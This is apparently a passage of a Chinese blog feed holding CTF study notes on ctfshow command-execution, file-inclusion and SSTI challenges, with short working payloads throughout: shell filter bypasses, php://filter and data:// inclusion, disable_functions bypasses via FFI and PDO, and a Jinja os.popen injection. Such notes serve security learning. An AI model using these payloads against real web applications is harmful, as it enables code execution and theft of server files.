-    <content type="html"><![CDATA[<p><a href="https://www.wlhhlc.top/posts/14827/">https://www.wlhhlc.top/posts/14827/</a></p><p>命令执行：</p><p>41 55 56</p><p>脚本没学why，做完了命令执行。差收集姿势与理解脚本，原理（后面几道大题）</p><p><a href="https://blog.csdn.net/qq_49480008/article/details/113177878">https://blog.csdn.net/qq_49480008/article/details/113177878</a></p><p><a href="https://ch1e.gitee.io/2021/07/23/ctfshowweb/">https://ch1e.gitee.io/2021/07/23/ctfshowweb/</a></p><p>?c&#x3D;system(‘cat f?ag.php’);</p><p>?c&#x3D;echo <code>cat f???.???</code>;</p><p>?c&#x3D;echo%0a<code>tac%09f???*</code>;  第二个%0a不行</p><p>32</p><p>?c&#x3D;include”$_GET[v]”?&gt;&amp;v&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php  还可以用日志？？</p><p>33</p><p>?c&#x3D;include$_GET[v]?&gt;&amp;v&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>?c&#x3D;include%0a$_GET[v]?&gt;&amp;v&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>?c&#x3D;include$_GET[v]?&gt;&amp;v&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>37</p><p>有意思的是，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;cat index.php&quot;)?&gt; 可以（F12得到源码）</span><br><span class="line">&lt;?php system(&quot;cat flag.php&quot;)?&gt;不可以</span><br><span class="line">&lt;?php system(&quot;cat flag.php&quot;);?&gt;可以</span><br></pre></td></tr></table></figure><p>？c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;</p><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,<?php system('cat fla*.php');?></p><p>40</p><p>可以用echo 空格 字母 ;下划线 英文括号</p><p>?c&#x3D;echo system(ls); 可以执行，但是接下来不知道怎么办 （坑）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class="line">    pos()：返回数组中的当前元素的值。</span><br><span class="line">    array_reverse()：数组逆序 scandir()：获取目录下的文件</span><br><span class="line">    next()：函数将内部指针指向数组中的下一个元素，并输出。 首先通过</span><br><span class="line">    pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。</span><br><span class="line"></span><br><span class="line">print_r(file_get_contents(next(array_reverse(scandir(pos(localeconv()))))));</span><br></pre></td></tr></table></figure><p>42</p><p>?c&#x3D;cat flag.php;</p><p>43</p><p>?c&#x3D;tac flag.php||</p><p>44</p><p>?c&#x3D;tac fla?.php||</p><p>45</p><p>?c&#x3D;tac%09fla?.php||</p><p>46</p><p>?c&#x3D;tac&lt;.&#x2F;fla\g.php||</p><p>?c&#x3D;tac${IFS}.&#x2F;fla\g.php||不行是怎么回事</p><p>47</p><p>?c&#x3D;tac&lt;.&#x2F;fla\g.php||</p><p>48</p><p>?c&#x3D;tac&lt;.&#x2F;fla\g.php||</p><p>49</p><p>?c&#x3D;vi&lt;.&#x2F;fla\g.php||</p><p>52</p><p>?c&#x3D;ca\t${IFS}fla\g.php||</p><p>?c&#x3D;ca\t${IFS}&#x2F;fla\g||</p><p>53</p><p>?c&#x3D;ca\t${IFS}fla\g.php</p><p>54</p><p>?c&#x3D;vi${IFS}fl?g.php</p><p>55</p><p>[a-z] 没过滤数字</p><p>?c&#x3D;&#x2F;???&#x2F;????64 ????????</p><p>56</p><p>无数字字母</p><p>57</p><p>wp说提示有说是flag在36.php</p><p>58-65</p><p>system尝试后，说被禁用，可以试试内置函数。</p><p>c&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p><p>66</p><p>print_r(scandir(‘&#x2F;‘));</p><p>c&#x3D;highlight_file(‘&#x2F;flag.txt’);</p><p>67</p><p>c&#x3D;var_dump(scandir(‘.’));</p><p>68</p><p>c&#x3D;var_dump(scandir(‘&#x2F;‘));</p><p>c&#x3D;include(‘&#x2F;flag.txt’);</p><p>69</p><p>71</p><p>c&#x3D;var_export(scandir(‘&#x2F;‘));exit();</p><p>c&#x3D;include(‘&#x2F;flag.txt’);exit();</p><p>72</p><p>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}exit;</p><p>用群主给的</p><p>73 74</p><p>c&#x3D;var_export(scandir(‘&#x2F;‘));exit();</p><p>c&#x3D;include(‘&#x2F;flagc.txt’);exit();</p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php    //前面的?&gt;用来闭合&lt;?</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);   //php使用glob遍历文件夹</span><br><span class="line">foreach($a as $f) </span><br><span class="line">&#123;</span><br><span class="line">echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125; </span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">直接复制hackbar不行</span><br><span class="line">转成</span><br><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);?&gt;  OK</span><br></pre></td></tr></table></figure><p>75</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);?&gt;</span><br><span class="line"></span><br><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br><span class="line"></span><br><span class="line">上面直接复制也是不行，删除空格后就可以了</span><br><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><p>76</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span>=FFI :: <span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();</span><br><span class="line">会报错，但是访问<span class="number">1</span>.txt还是会得到</span><br><span class="line">直接读取flag36x.txt读取不出来，所以用readflag</span><br></pre></td></tr></table></figure><p>77</p><p>过滤小写字母数字，() &#96; &gt;  &lt; % &#x2F; |</p><p>可以用的$ {} ; _ ?. ~ 大写字母</p><p>code&#x3D;${PATH:<del>A}${PWD:</del>A} ????.???;</p><p>78</p><p>多过滤了PATH</p><p>118</p><p>code&#x3D;${PATH:<del>A}${PWD:</del>A} ????.???</p><p>119</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br><span class="line">#/bin/cat flag.php </span><br><span class="line">$&#123;USER:~2:2&#125;-&gt;at  www-data</span><br><span class="line">PHP_VERSION:7.3.22</span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>120</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line">但发现长度是66还是超了，接着我们把$&#123;#&#125;去掉，也是可以的，最终payload如下：</span><br><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line">#/bin/cat flag.php</span><br></pre></td></tr></table></figure><p>121</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="line">#/bin/base64 flag.php</span><br><span class="line">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br><span class="line">#/bin/rev flag.php</span><br></pre></td></tr></table></figure><p>122</p><p>较之放了&lt; HOME  不过这个 上一题的% 和 %不知道过滤什么东西</p><p>禁了#</p><p>123</p><p>code&#x3D;&lt;A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???</p><p>124</p><p><a href="https://blog.csdn.net/qq_44657899/article/details/106104340">https://blog.csdn.net/qq_44657899/article/details/106104340</a></p><p>搜刮：wp</p><p><a href="https://ch1e.gitee.io/2021/07/23/ctfshowweb/">https://ch1e.gitee.io/2021/07/23/ctfshowweb/</a></p><p><a href="https://xz.aliyun.com/t/8354#toc-5">https://xz.aliyun.com/t/8354#toc-5</a></p><p><a href="https://blog.csdn.net/tomyyyyyy/article/details/115403458">https://blog.csdn.net/tomyyyyyy/article/details/115403458</a></p><p><a href="https://blog.csdn.net/weixin_44700621/article/details/125381763">https://blog.csdn.net/weixin_44700621/article/details/125381763</a></p><p><a href="https://www.freebuf.com/articles/network/279563.html">https://www.freebuf.com/articles/network/279563.html</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p>[<a href="https://blog.csdn.net/solitudi/article/details/109837640">CTFSHOW]命令执行_ctfshow命令执行_Y4tacker的博客-CSDN博客</a></p><p>文件包含：</p><p><a href="https://blog.csdn.net/qq_49480008/article/details/113696392">https://blog.csdn.net/qq_49480008/article/details/113696392</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/116205407">https://blog.csdn.net/miuzzx/article/details/116205407</a></p><p><a href="https://xz.aliyun.com/t/5535">https://xz.aliyun.com/t/5535</a></p><p><a href="https://www.cnblogs.com/Zeker62/p/15322771.html">https://www.cnblogs.com/Zeker62/p/15322771.html</a></p><p>78</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>79</p><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKT8%2b</p><p>80</p><p>PHP特性：</p><p>web90 4476a 4476.1</p><p>web92 93</p><p>4476.1</p><p>94 4476.0</p><p>96开始</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.wlhhlc.top/posts/14827/&quot;&gt;https://www.wlhhlc.top/posts/14827/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;命令执行：&lt;/p&gt;
-&lt;p&gt;41 55 56&lt;/p&gt;
-&lt;p&gt;脚本没学why，做完了命令执行</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>ctfshow愚人杯</title>
-    <link href="http://van0308.github.io/2023/04/ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/"/>
-    <id>http://van0308.github.io/2023/04/ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/</id>
-    <published>2023-04-01T15:07:00.000Z</published>
-    <updated>2023-04-07T13:36:44.352Z</updated>
-    
-    <content type="html"><![CDATA[<p>ctfshow{一个不能说的秘密}</p><p>ssti</p><p>过滤了&#x2F;</p><p>&#x2F;hello&#x2F;%7B%7Blipsum.<strong>globals</strong>[‘os’].popen(‘<code>echo &quot;Y2F0IC9mbGFn&quot;|base64 -d</code>‘).read()%7D%7D</p><p><a href="https://blog.csdn.net/destiny10242048/article/details/129916697">https://blog.csdn.net/destiny10242048/article/details/129916697</a></p><p>官方<a href="https://ctf-show.feishu.cn/docx/KTfvd3GCOodJrRxVnk5ck1LunYb">https://ctf-show.feishu.cn/docx/KTfvd3GCOodJrRxVnk5ck1LunYb</a></p><p>之前的</p><p><a href="https://www.cnblogs.com/Suica/p/16092730.html#/c/subject/p/16092730.html">https://www.cnblogs.com/Suica/p/16092730.html#/c/subject/p/16092730.html</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;ctfshow{一个不能说的秘密}&lt;/p&gt;
-&lt;p&gt;ssti&lt;/p&gt;
-&lt;p&gt;过滤了&amp;#x2F;&lt;/p&gt;
-&lt;p&gt;&amp;#x2F;hello&amp;#x2F;%7B%7Blipsum.&lt;strong&gt;globals&lt;/strong&gt;[‘os’].popen(‘&lt;code&gt;echo &amp;quo</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>ritsecctf2023</title>
-    <link href="http://van0308.github.io/2023/04/%E7%AB%9E%E8%B5%9B/ritsecctf2023/"/>
-    <id>http://van0308.github.io/2023/04/%E7%AB%9E%E8%B5%9B/ritsecctf2023/</id>
-    <published>2023-04-01T14:06:35.000Z</published>
-    <updated>2023-04-07T13:03:54.847Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>Never gonna turn around giveyouup letyoudown desert you</p><p>没想到&#x2F;和|不用删掉的，然后顺序的话，根据歌词的顺序来拼接</p><p>RS{&#x2F;/eveRG0nna_<br><em>TuRna30unD</em><br>G1v3y0uuP<br><em>|3tY0|</em>|d0vvn_<br>_D3s3RTy0u}</p><p><code>RS&#123;/\/eveRG0nna_G1v3y0uuP_|3tY0|_|d0vvn__TuRna30unD__D3s3RTy0u&#125;</code></p><p>wp</p><p><a href="https://ctftime.org/event/1860/tasks/">https://ctftime.org/event/1860/tasks/</a></p><p><a href="https://www.leoreading.com/blog/ritsec-ctf-2023/web/pickle-store#/">https://www.leoreading.com/blog/ritsec-ctf-2023/web/pickle-store#/</a></p><h2 id="Broken-Bot"><a href="#Broken-Bot" class="headerlink" title="Broken Bot"></a>Broken Bot</h2><p><a href="https://www.leoreading.com/blog/ritsec-ctf-2023/web/broken-bot#/">https://www.leoreading.com/blog/ritsec-ctf-2023/web/broken-bot#/</a></p><p><a href="https://siunam321.github.io/ctf/RITSEC-CTF-2023/Web/Broken-Bot/">https://siunam321.github.io/ctf/RITSEC-CTF-2023/Web/Broken-Bot/</a></p><p><a href="https://gitlab.ritsec.cloud/competitions/ctf-2023-public/-/tree/master">https://gitlab.ritsec.cloud/competitions/ctf-2023-public/-/tree/master</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h3 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h3&gt;&lt;p&gt;Never gonna turn around giveyouup letyoudown desert you&lt;/p&gt;
-&lt;p&gt;没想到</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>ctfshowmisc入门</title>
-    <link href="http://van0308.github.io/2023/03/ctfshow/web/ctfshowmisc%E5%85%A5%E9%97%A8/"/>
-    <id>http://van0308.github.io/2023/03/ctfshow/web/ctfshowmisc%E5%85%A5%E9%97%A8/</id>
-    <published>2023-03-31T14:25:42.000Z</published>
-    <updated>2023-04-06T12:59:45.435Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><p>常见文件头尾</p><p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865">https://blog.csdn.net/xiangshangbashaonian/article/details/80156865</a></p><p><a href="https://blog.csdn.net/LYJ20010728/article/details/119193793">https://blog.csdn.net/LYJ20010728/article/details/119193793</a></p><p><a href="https://harvey.plus/index.php/archives/62/#toc-misc10">https://harvey.plus/index.php/archives/62/#toc-misc10</a></p><p><a href="https://www.cnblogs.com/sakura--tears/p/17148309.html">https://www.cnblogs.com/sakura--tears/p/17148309.html</a></p><p><a href="https://blog.csdn.net/Aluxian_/article/details/125831308">https://blog.csdn.net/Aluxian_/article/details/125831308</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h3 id=&quot;wp&quot;&gt;&lt;a href=&quot;#wp&quot; class=&quot;headerlink&quot; title=&quot;wp&quot;&gt;&lt;/a&gt;wp&lt;/h3&gt;&lt;p&gt;常见文件头尾&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/xiangshangbashaonian/arti</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>入门</title>
-    <link href="http://van0308.github.io/2023/03/ctfshow/web/ctfshowweb%E5%85%A5%E9%97%A8/"/>
-    <id>http://van0308.github.io/2023/03/ctfshow/web/ctfshowweb%E5%85%A5%E9%97%A8/</id>
-    <published>2023-03-30T08:26:43.000Z</published>
-    <updated>2023-03-30T08:26:47.972Z</updated>
-    
-    <content type="html"><![CDATA[<p>记录知识点，扫盲。</p><p>参考wp</p><p><a href="https://www.wlhhlc.top/posts/14827/">https://www.wlhhlc.top/posts/14827/</a></p><h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3><p>探针，PHP探针</p><p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。是一个查看服务器信息的工具。<br>比如查看服务器支持什么，不支持什么，空间速度等等状况！</p><p>tz.php</p><p>mdb文件泄露</p><blockquote><p>mdb文件是早期asp+access构架的数据库文件</p></blockquote><p>于是我们访问&#x2F;db&#x2F;db.mdb</p><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>没看</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>有的过滤的是中文的符号，看清楚</p><h5 id="eval-c"><a href="#eval-c" class="headerlink" title="eval($c)"></a>eval($c)</h5><p>思路，嵌套——?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“ls”);</p><p>分号过滤——用?&gt;代替</p><p>括号过滤——用include 函数（require等不带括号的函数）?c&#x3D;include%0a$_POST[1]?&gt; </p><p>结合伪协议，读取文件</p><p>短标签<?=xxx?>  会echo出来 <??>不会echo出来</p><p>读取文件函数</p><h3 id="无参数rce-待学"><a href="#无参数rce-待学" class="headerlink" title="无参数rce 待学"></a>无参数rce 待学</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(‘.’)); 查看当前目录下的所有文件名</span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</span><br></pre></td></tr></table></figure><h6 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h6><p>41、</p><p>或、</p><h5 id="include-c"><a href="#include-c" class="headerlink" title="include($c)"></a>include($c)</h5><h5 id="题目拼接"><a href="#题目拼接" class="headerlink" title="题目拼接"></a>题目拼接</h5><p>system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt</span><br><span class="line">2：/dev/null 代表空设备文件</span><br><span class="line">3：2&gt; 表示stderr标准错误</span><br><span class="line">4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1</span><br><span class="line">5：1 表示stdout标准输出，系统默认值是1，所以&quot;&gt;/dev/null&quot;等同于 “1&gt;/dev/null”</span><br><span class="line">因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</span><br><span class="line"></span><br><span class="line">那么本文标题的语句执行过程为：</span><br><span class="line">1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。</span><br><span class="line">2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</span><br></pre></td></tr></table></figure><p>绕过：用<code>;</code>号或者<code>||</code>等等一些命令分隔符进行命令分隔</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php;</span><br></pre></td></tr></table></figure><p>无字母数字</p><p>56、57</p><p>$()</p><p>顺序</p><p>71  payload后面加上exit();</p><p>72 7577 118 后面都没</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>日志包含81后都没看</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;记录知识点，扫盲。&lt;/p&gt;
-&lt;p&gt;参考wp&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://www.wlhhlc.top/posts/14827/&quot;&gt;https://www.wlhhlc.top/posts/14827/&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;信息收集：&quot;&gt;&lt;a </summary>
       
     
     
